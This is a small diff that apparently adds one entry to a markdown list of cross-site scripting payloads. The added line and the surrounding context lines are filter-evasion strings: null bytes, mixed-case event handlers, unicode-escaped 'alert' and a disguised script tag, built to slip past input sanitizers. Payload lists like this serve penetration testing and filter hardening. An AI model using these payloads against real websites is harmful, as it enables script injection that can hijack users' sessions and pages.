@@ -201,6 +201,7 @@
   XSS"><html><select %00 onControl onpointerenter=prompt(domain) hello>
   XSS"><input %00 onControl hello oninput=confirm(domain) x>
   "()%26%25<acx><ScRiPt%20>N8Zn(9266)</ScRiPt>
+  <fieldset//%00//onsite OnMoUsEoVeR=\u0061\u006C\u0065\u0072\u0074`/AmoloHT/`>
   ```
 </details>
 
